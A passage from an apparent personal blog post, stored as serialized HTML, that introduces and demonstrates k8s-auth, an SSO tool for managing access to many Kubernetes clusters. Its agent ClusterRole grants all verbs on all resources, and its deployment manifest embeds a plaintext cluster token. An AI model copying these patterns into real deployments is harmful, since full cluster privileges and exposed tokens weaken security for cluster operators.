class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Namespace</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br></pre></td></tr></table></figure>\n<p>This service account need a clusterrole that allow to create roles to anything!  to grant permission for creating pods you must have this permission first! You can’t give permission of create something and you can’t do it!!!</p>\n<p>Next, the service account will need an appropriate permissions to carry out its mission inside the cluster. Specifically, it requires a clusterrole that grants permission to create roles for any resource.</p>\n<p>In kubernetes world, granting permission to create something requires that you have the permission yourself!. For example, you can’t grant permission to create pods if you don’t have permission to create pods even you have permission to create roles!!</p>\n<p>Let’s create the clusterole and the binding!</p>\n<figure class=\"highlight yaml\"><figcaption><span>create cluster role</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;*&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ClusterRoleBinding</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">roleRef:</span></span><br><span class=\"line\">  <span class=\"attr\">apiGroup:</span> <span class=\"string\">rbac.authorization.k8s.io</span></span><br><span class=\"line\">  <span class=\"attr\">kind:</span> <span class=\"string\">ClusterRole</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">subjects:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">kind:</span> <span class=\"string\">ServiceAccount</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br></pre></td></tr></table></figure>\n<p>Now it’s time to the last part! we will deploy the agent itself! The agent need to know some information so as expected there is some environement variable!</p>\n<ul>\n<li><code>CLUSTER_NAME</code> : is the same name that you put it inside the authentication server</li>\n<li><code>TOKEN</code> : The generated token from the authentication server</li>\n<li><code>SERVER</code> : The authentication server itself</li>\n<li><code>API_SERVER</code> : This is contains the public hostname for the API SERVER. The agent can detect it correctly when you have a cluster inside Network and the cluster is not exposed in the internet</li>\n</ul>\n<blockquote>\n<p>I used kubeadm clusters in provisionning clusters. I didn’t find a way to find the public hostname! So you need to indicate the api server until it will be fixed!</p>\n</blockquote>\n<figure class=\"highlight yaml\"><figcaption><span>deploy</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  <span class=\"attr\">labels:</span></span><br><span class=\"line\">    <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"attr\">selector:</span></span><br><span class=\"line\">    <span class=\"attr\">matchLabels:</span></span><br><span class=\"line\">      <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">  <span class=\"attr\">strategy:</span> &#123;&#125;</span><br><span class=\"line\">  <span class=\"attr\">template:</span></span><br><span class=\"line\">    <span class=\"attr\">metadata:</span></span><br><span class=\"line\">      <span class=\"attr\">creationTimestamp:</span> <span class=\"literal\">null</span></span><br><span class=\"line\">      <span class=\"attr\">labels:</span></span><br><span class=\"line\">        <span class=\"attr\">app:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">    <span class=\"attr\">spec:</span></span><br><span class=\"line\">      <span class=\"attr\">serviceAccountName:</span> <span class=\"string\">k8s-auth</span></span><br><span class=\"line\">      <span class=\"attr\">containers:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">image:</span> <span class=\"string\">mohamedrafraf/k8s-auth-kube</span> </span><br><span class=\"line\">        <span class=\"attr\">name:</span> <span class=\"string\">k8s-auth-kube</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">CLUSTER_NAME</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">ctf-cluster</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">TOKEN</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">&quot;Z8taw1yFw4lsq7cgSvmZ&quot;</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">SERVER</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">&quot;https://auth.4n6nk8s.tech&quot;</span></span><br><span class=\"line\">          <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">API_SERVER</span></span><br><span class=\"line\">            <span class=\"attr\">value:</span> <span class=\"string\">https://172.190.91.84:6443</span></span><br><span class=\"line\">        <span class=\"attr\">resources:</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">status:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>After deploying the agent. you can check the clusters with the cli again and you’ll find everything is ok!<br>\n<img data-src=\"https://imgur.com/MqHeeY1.png\" alt=\"\"></p>\n<p>The cluster is on Active status and the api server is not empty now! You can repeat this operation with many clusters and this is how multi-clusters can work together!</p>\n<h2 id=\"create-users-and-groups\"><a class=\"markdownIt-Anchor\" href=\"#create-users-and-groups\">#</a> Create Users and Groups</h2>\n<p>The cluster is now ready for authentication and has been verified to be functioning without any issues. The connection between the cluster and authentication has been established. Now, let’s proceed to creating groups and users.</p>\n<p>Let’s see what  <code>k8s-auth create</code>  can do for us!</p>\n<p><img data-src=\"2023-04-29-15-56-38.png\" alt=\"\"></p>\n<p>Great news! With the  <code>k8s-auth create</code>  command, you can easily create groups and users for your authenticated clusters. To create a group, simply specify the cluster and provide a YAML manifest file containing the roles for that group. For creating a user, you can either assign them to an existing group or provide a YAML manifest file for the user’s roles if they do not belong to any group.</p>\n<p>Let’s define the role for our group that we will create!</p>\n<figure class=\"highlight yaml\"><figcaption><span>group rule</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Role</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">dev</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pod-and-secret</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;pods&quot;</span>,<span class=\"string\">&quot;secrets&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;list&quot;</span>,<span class=\"string\">&quot;create&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Role</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">prod</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pod-list</span></span><br><span class=\"line\"><span class=\"attr\">rules:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">apiGroups:</span> [<span class=\"string\">&quot;&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">resources:</span> [<span class=\"string\">&quot;pods&quot;</span>]</span><br><span class=\"line\">  <span class=\"attr\">verbs:</span> [<span class=\"string\">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>\n<p>The group we’re about to create will be granted permission to create and list pods and secrets in the “dev” namespace, while they will only be able to list pods in the “prod” namespace.</p>\n<blockquote>\n<p>Any user will be belong to this group will have these permissions! You don’t have to repeat the same manifest for each user!. This is why groups exists!</p>\n</blockquote>\n<p>This command will create the group for you</p>\n<figure class=\"highlight bash\"><figcaption><span>command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth create group &lt;name&gt; --cluster=&lt;cluster&gt; --file=&lt;rbac_file&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://imgur.com/g5YBB8u.png\" alt=\"\"></p>\n<p>As you can see here! The group is create successfully and you can see his permission when you forget it using  <code>k8s-auth get permission</code>  command!</p>\n<p>You can discover what you can do with  <code>k8s-auth get</code>  command!! You can a list users too!</p>\n<p><img data-src=\"https://imgur.com/MOC7L1o.png\" alt=\"\"></p>\n<p>Now let’s create a user that belong to this group! So we don’t need to specify any manifest file that define roles!</p>\n<figure class=\"highlight bash\"><figcaption><span>user</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth create user --name &lt;name&gt; --fullname &lt;value&gt; --mail &lt;mail&gt; --cluster &lt;cluster&gt; --group &lt;group&gt;</span><br></pre></td></tr></table></figure>\n<p>In case that you want to create a user that don’t belongs to any group and have his own permission you can delete the  <code>--group</code>  and change it with  <code>--file</code>  and specify the yaml file that contains his roles!</p>\n<blockquote>\n<p>No need to worry about naming roles because there won’t be any overlapping between them. The agent takes care of creating roles and bindings in the background, and the names you specify in the manifest won’t be used directly.</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/n2S8BQM.png\" alt=\"\"></p>\n<p>You can update the permission using the  <code>k8s-auth update permisssion</code>  command! This command can update groups and users permission</p>\n<p>In case you change the permission for a user that belgons to a group. This user will leave that group because he will have his own permissions (different from the group one)</p>\n<blockquote>\n<p>You can’t delete a group if is not empty!</p>\n</blockquote>\n<blockquote>\n<p>When User have an opened session with a cluster and use kubectl normally and you decide to delete that user the session will be closed and he can’t do anything!</p>\n</blockquote>\n<h2 id=\"authenticate-to-a-cluster\"><a class=\"markdownIt-Anchor\" href=\"#authenticate-to-a-cluster\">#</a> Authenticate to a cluster</h2>\n<p>As a regular user you need to login to the authentication server using  <code>k8s-auth login</code>  and you’ll receive a link as the admin login process!</p>\n<p>Then you can list the clusters that you can authenticate with using  <code>k8s-auth get clusters</code>  and keep in your mind that you’ll never see the token of each cluster (Only admins can see tokens)</p>\n<p>Once you decided which cluster you’ll authenticate! run the command  <code>k8s-auth auth</code>  with specifying the cluster name!</p>\n<figure class=\"highlight bash\"><figcaption><span>authenticate</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k8s-auth auth cluster=ctf-cluster</span><br><span class=\"line\"></span><br><span class=\"line\">To use this cluster run this <span class=\"built_in\">command</span>: <span class=\"built_in\">export</span> KUBECONFIG=<span class=\"variable\">$HOME</span>/.k8s-auth.config</span><br></pre></td></tr></table></figure>\n<p>If you’re authorized, you’ll receive a message like that! What is happening?</p>\n<p>Actually the k8s-auth CLI generate a kubeconfig file for you! run the command that the CLI suggest to you! BOOOM Start Kubectlying !!! xD</p>\n<h2 id=\"conclusion\"><a class=\"markdownIt-Anchor\" href=\"#conclusion\">#</a> Conclusion</h2>\n<p>As highlighted in the blog post, the process of authentication has been simplified with just 3 simple commands - login, auth, and export KUBECONFIG. These commands enable users to easily open a session with any cluster they want, regardless of the number of clusters and different permissions required, using just a single set of credentials. Additionally, the administrator can easily set up agents in the clusters, and manage the permissions and the entire process centrally using a smooth command line interface.</p>\n","site":{"data":{}},"length":17763,"excerpt":"","more":"<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<h2 id=\"how-it-comes\"><a class=\"markdownIt-Anchor\" href=\"#how-it-comes\">#</a> How it comes</h2>\n<p>As a university student, I was assigned to create an authentication project for a specific system. But instead of choosing a traditional approach like Kerberos, I decided to spice things up and bring Kubernetes and cloud-native technologies into the mix (Typical Me). After diving into the official documentation, I was hit with a barrage of authentication strategies like X509 client certs, Static Token File, Bootstrap tokens, Service Accounts, OIDC tokens, and more. My head was spinning! Then I stumbled upon some existing authentication tools like Dex, Keycloak, and Pinniped. Terms like OIDC and OAuth2 were thrown around left and right. But I wasn’t intimidated! I accepted the challenge and declared: “It’s implementation time!” And thus, the k8s-auth project was born.</p>\n<h2 id=\"why-k8s-auth-is-born\"><a class=\"markdownIt-Anchor\" href=\"#why-k8s-auth-is-born\">#</a> Why k8s-auth is born</h2>\n<p>Managing access to Kubernetes clusters can be a challenging task, especially in large organizations where multiple teams and users need different levels of permissions. While Kubernetes provides a robust RBAC system, configuring and maintaining it can be time-consuming and error-prone, particularly if you have many clusters to manage.<br>\nIt can feel like you’re playing a never-ending game of whack-a-mole, trying to keep up with the constant changes and updates. And let’s be honest, it’s not the most exciting task in the world. Moving from one cluster to another, constantly changing contexts, generating kubeconfig for users, and dealing with permission problems can quickly become a chore.</p>\n<p><img data-src=\"https://imgur.com/a5zaVhH.png\" alt=\"\"></p>\n<h2 id=\"before-starting\"><a class=\"markdownIt-Anchor\" href=\"#before-starting\">#</a> Before Starting</h2>\n<p>Before you start reading this blog post, let’s make sure you’re ready to dive into the k8s-auth server world. First, make sure you have a solid understanding of Kubernetes basics and RBAC, as we’ll be building on those concepts. Don’t worry, we won’t ask you to explain any Kubernetes concept in binary code. We just need you to understand what a service account is, what roles and role bindings mean, and why a service account needs a secret. So, if these concepts are still a mystery to you, go ahead and brush up on your Kubernetes knowledge before jumping in. And if you need a refresher, don’t worry, we won’t judge you. We’ll just send you back to Kubernetes school.</p>\n<h1 id=\"k8s-auth-the-sso-based-authentication-mechanism-for-multi-clusters\"><a class=\"markdownIt-Anchor\" href=\"#k8s-auth-the-sso-based-authentication-mechanism-for-multi-clusters\">#</a> K8S-AUTH : The SSO-Based Authentication Mechanism for Multi-Clusters!</h1>\n<h2 id=\"what-is-k8s-auth\"><a class=\"markdownIt-Anchor\" href=\"#what-is-k8s-auth\">#</a> What is k8s-auth ?</h2>\n<p>K8s-auth is a tool that provides authentication and authorization mechanisms for multiple Kubernetes clusters. With k8s-auth, users can authenticate to multiple clusters using a single set of credentials. This eliminates the need for users to have different credentials for different clusters, simplifying the authentication process. K8s-auth also allows administrators to manage user and group permissions across multiple clusters from a single centralized location, making it easier to maintain security and access control.</p>\n<p><img data-src=\"https://imgur.com/awkZvAb.png\" alt=\"\"></p>\n<h2 id=\"the-authentication-server\"><a class=\"markdownIt-Anchor\" href=\"#the-authentication-server\">#</a> The Authentication server</h2>\n<p>“K8s-Auth Server” is an open-source authentication server designed to simplify the authorization and authentication process for users and groups within specific Kubernetes clusters. With this server, administrators can easily manage access controls for multiple clusters, all from a centralized location.</p>\n<p>With the k8s-auth server, you can say goodbye to the headache of managing RBAC configurations across multiple clusters. Instead, you can focus on the fun part of being an admin - creating users, deleting users, modifying users, creating groups, deleting groups, modifying groups, and more! And the best part? You get to do it all with a single set of credentials, like a master key that unlocks all the doors to the kingdom of Kubernetes.</p>\n<p>But wait, there’s more! With SSO-based access, users can connect to multiple clusters with different permissions based on their role on each cluster, all without having to enter a password a million times. It’s like having a backstage pass to all the coolest Kubernetes events without ever having to wait in line.</p>\n<h2 id=\"how-this-server-communicate-with-clusters\"><a class=\"markdownIt-Anchor\" href=\"#how-this-server-communicate-with-clusters\">#</a> How This Server Communicate with Clusters ?</h2>\n<p>K8s-Auth Server is designed to work seamlessly with K8s-Auth Controller, a cloud-native application that is deployed within the Kubernetes cluster. This controller acts as an agent for the server, facilitating communication between the server and the cluster.</p>\n<p><img data-src=\"https://imgur.com/0PK9Sj5.png\" alt=\"\"></p>\n<p>Before a cluster can be used with K8s-Auth Server, it must be registered with the server by the administrator. When a cluster is registered, a secret token is created, which must be used by the agent/controller deployed within the cluster to verify its existence. Once the agent/controller is verified, a connection between the cluster and the server is opened (web socket) for data communication.</p>\n<p><img data-src=\"https://imgur.com/F1EVKK3.png\" alt=\"\"></p>\n<h2 id=\"how-to-interact-with-this-server\"><a class=\"markdownIt-Anchor\" href=\"#how-to-interact-with-this-server\">#</a> How to interact with this Server</h2>\n<p>K8s-Auth Server comes with a powerful CLI utility that can be used by both administrators and users. The CLI behaves differently based on the user’s role - administrators can create, modify, and delete users, groups, and clusters, while normal users can check the clusters that they are authorized to connect with. Once the users selects the cluster they want to authenticate with, the CLI will automatically generate a kubeconfig file, making it easy for users to connect to the cluster and start working.</p>\n<h2 id=\"how-users-logs-to-the-server\"><a class=\"markdownIt-Anchor\" href=\"#how-users-logs-to-the-server\">#</a> How users logs to the server</h2>\n<p>To connect to any cluster, users must first authenticate with the K8s-Auth Server. Authentication with the server is done using OAuth2 with Google, allowing users to use one set of credentials to connect to multiple clusters with different permissions based on their role on each cluster. This type of authentication can be referred to as SSO-based authentication.</p>\n<h2 id=\"what-happen-when-user-want-to-authenticate-to-a-cluster\"><a class=\"markdownIt-Anchor\" href=\"#what-happen-when-user-want-to-authenticate-to-a-cluster\">#</a> What happen when user want to authenticate to a cluster ?</h2>\n<p>On the user side, when a user logs into the K8s-Auth Server, they can check the clusters they are authorized to access. After selecting the desired cluster, a request is sent to the server, which checks if the user is authorized to connect. If authorized, the server sends a request to the specific agent/controller, which creates the necessary Kubernetes resources, such as service accounts, roles, role bindings, and secrets, allowing the user to connect to the cluster and return the token and ca.crt that allow the automatic generation of the kubeconfig.</p>\n<h2 id=\"the-agentcontroller-role\"><a class=\"markdownIt-Anchor\" href=\"#the-agentcontroller-role\">#</a> The Agent/Controller role</h2>\n<p>The agent/controller also manages the lifecycle of the secret and token, deleting them and all related roles and bindings after they expire or are no longer needed. For example, if an administrator decides to remove a user from a cluster, the agent/controller will delete the secret that holds the user’s token, as well as the service account, roles, and bindings associated with that user.</p>\n<h2 id=\"before-demo\"><a class=\"markdownIt-Anchor\" href=\"#before-demo\">#</a> Before DEMO</h2>\n<blockquote>\n<p>Please note that this project is open source and the code is available to anyone interested. It is currently an MVP version that functions effectively, and we plan to add more features in the future.</p>\n</blockquote>\n<blockquote>\n<p>Don’t forget that this project is open to contributions from the community! If you find a bug or have a feature request, feel free to open an issue on the project’s GitHub page. And if you’re interested in helping out with the development, pull requests are always welcome! Let’s work together to make this project even better.</p>\n</blockquote>\n<div class=\"links\"><div class=\"item\" title=\"k8s-auth-server\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLXNlcnZlcg==\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLXNlcnZlcg==\">k8s-auth-server</span>\n          <p class=\"desc\">The authentication server</p>\n          </div></div><div class=\"item\" title=\"k8s-auth-kube\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWt1YmU=\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWt1YmU=\">k8s-auth-kube</span>\n          <p class=\"desc\">The Controller/Agent for k8s-auth</p>\n          </div></div><div class=\"item\" title=\"k8s-auth-cli\" style=\"--block-color:#02bf1b;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWNsaQ==\" data-background-image=\"https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vaGFtZWQtUmFmcmFmL2s4cy1hdXRoLWNsaQ==\">k8s-auth-cli</span>\n          <p class=\"desc\">The CLI utility for k8s-auth</p>\n          </div></div></div>\n<h1 id=\"the-demo\"><a class=\"markdownIt-Anchor\" href=\"#the-demo\">#</a> The DEMO !</h1>\n<p>And the icing on the cake? I am going to show you how to set up and use k8s-auth in a demo that will blow your mind (in a good way, of course). So grab your popcorn and let’s get this Kubernetes party started!</p>\n<p>Ladies and Gentlemen, it’s showtime! Let’s get ready to k8s-authenticate! We’ll be putting the spotlight on three stars of this demo: The Authentication Server, The Agent/Controller, and the Command Line Utility! These babies were born to shine in the Go language (talk about power!) and are all open-source, so you can check them out on my GitHub page. And, to make things even easier, we’ve containerized the authentication server and agent, so you can just pull them like a cold one on a hot summer day. Check out my Docker Hub profile for more juicy details!</p>\n<h2 id=\"setting-up-authentication-server\"><a class=\"markdownIt-Anchor\" href=\"#setting-up-authentication-server\">#</a> Setting up Authentication Server</h2>\n<p>Hold your horses, folks! The authentication server may be containerized, but it’s not going inside Kubernetes! Don’t forget to set up those environment variables for the server - especially the admin email! (He deserve a name and a full name too, don’t they?) And guess what, the admin can log in with Google OAuth2! Just make sure to give the Client ID, Client Secret, and Redirection Link, or else things won’t work too smoothly.</p>\n<blockquote>\n<p>You need to create an OAuth 2.0 Client with the Google API in google cloud platform!</p>\n</blockquote>\n<p><img data-src=\"https://imgur.com/YqhD79J.png\" alt=\"\"></p>\n<ul>\n<li><code>K8S_AUTH_ADMIN_NAME</code> : The administrator name! (My name is default value)</li>\n<li><code>K8S_AUTH_ADMIN_FULLNAME</code> : The administrator name! (My name is default value)</li>\n<li><code>K8S_AUTH_ADMIN_MAIL</code> : The administrator name! (My email is default value)</li>\n<li><code>OAUTH2_CLIENT_ID</code> : The google Oauth2 Client ID (Required)</li>\n<li><code>OAUTH2_CLIENT_SECRET</code> : The google Oauth2 Secret  (Required)</li>\n<li><code>OAUTH2_REDIRECT_URL</code> : The google Oauth2 Redirect URL callback (Required, it must be redirected to /callback endpoint of your server )</li>\n</ul>\n<blockquote>\n<p>Let’s assume that the server is deployed on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoLjRuNm5rOHMudGVjaA==\">https://auth.4n6nk8s.tech</span>,<br>\n <code>OAUTH2_REDIRECT_URL</code>  must be <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hdXRoLjRuNm5rOHMudGVjaC9jYWxsYmFjaw==\">https://auth.4n6nk8s.tech/callback</span></p>\n</blockquote>\n<p>It’s docker time!  <code>mohamedrafraf/k8s-auth-server</code>  is the docker image that you need! Let’s run this server!</p>\n<figure class=\"highlight bash\"><figcaption><span>run server</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --name server -it -p 80:8080 -e OAUTH2_CLIENT_ID=xxxx -e OAUTH2_CLIENT_SECRET=xxx ... mohamedrafraf/k8s-auth-server</span><br></pre></td></tr></table></figure>\n<p>Make sure to input all the necessary variables for the server to run smoothly. And once you’ve done that, sit back and relax, and let the server do its thing! Keep your hands off those logs, let them flow in peace!</p>\n<h2 id=\"interacting-with-server-using-k8s-auth-cli\"><a class=\"markdownIt-Anchor\" href=\"#interacting-with-server-using-k8s-auth-cli\">#</a> Interacting with server using k8s-auth CLI</h2>\n<p>It’s CLI installation time, folks! This nifty command line utility is your ticket to the k8s-auth party. With the CLI, you can log in as an admin or regular user and interact with the server based on your permission level.</p>\n<p>But wait, there’s more! For the first time, only the admin with their fancy schmancy email address can access the server. They’ll be the ones registering the cluster, setting up the agent, and creating a connection between the server and the agent. Then, it’s time to have some fun with users, groups, and permissions. Who said authentication couldn’t be funny?</p>\n<p>You can build the command line utility or download it by running:</p>\n<figure class=\"highlight bash\"><figcaption><span>download cli</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/Mohamed-Rafraf/k8s-auth-cli/releases/download/test/k8s-auth</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> +x k8s-auth &amp;&amp; sudo <span class=\"built_in\">mv</span> k8s-auth /usr/bin</span><br></pre></td></tr></table></figure>\n<p>Now, you can use this command line utility just like any other tool in your system!</p>\n<p><img data-src=\"https://imgur.com/EciPajC.png\" alt=\"\"></p>\n<p>Before start playing with this command line you need to know that on each command you need to specify the authentication server that you want to interact with! So either you user  <code>--server</code>  on each command or use  <code>K8S_AUTH_SERVER</code>  environment variable to make it more easy for you! I’ll go with the 2nd option!</p>\n<figure class=\"highlight bash\"><figcaption><span>export env var</span></figcaption><table><tr><td class=\"gutter\"><pre><span 